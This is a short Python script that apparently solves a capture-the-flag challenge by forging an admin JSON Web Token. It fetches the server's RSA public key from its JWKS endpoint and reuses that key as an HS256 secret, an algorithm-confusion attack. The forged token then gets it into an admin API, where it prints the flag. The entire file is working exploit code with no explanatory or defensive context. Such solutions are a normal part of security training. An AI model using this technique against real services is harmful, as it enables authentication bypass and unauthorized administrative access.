import jwt, time, requests
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from jwt.utils import base64url_decode

url = 'https://cddc2026.xyz:7000'
s = requests.Session()

res = s.post(f'{url}/login', json={
    'username': 'guest',
    'password': 'guest1234'
})

res = s.get(f"{url}/.well-known/jwks.json")

data = res.json()['keys'][0]

n, e = data['n'], data['e']

pub_numbers = rsa.RSAPublicNumbers(
    int.from_bytes(base64url_decode(e), "big"),
    int.from_bytes(base64url_decode(n), "big")
)

pubkey = pub_numbers.public_key(default_backend())

pem = pubkey.public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo
)

payload = {
    "sub": "guest",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 86400
}

token = jwt.encode(payload, pem, algorithm="HS256", headers={"typ": "JWT", "alg": "HS256"})

res = s.get(f'{url}/api/admin', headers={
    'Authorization': f'Bearer {token}'
})

flag = res.json()['flag']

print("Flag:", flag)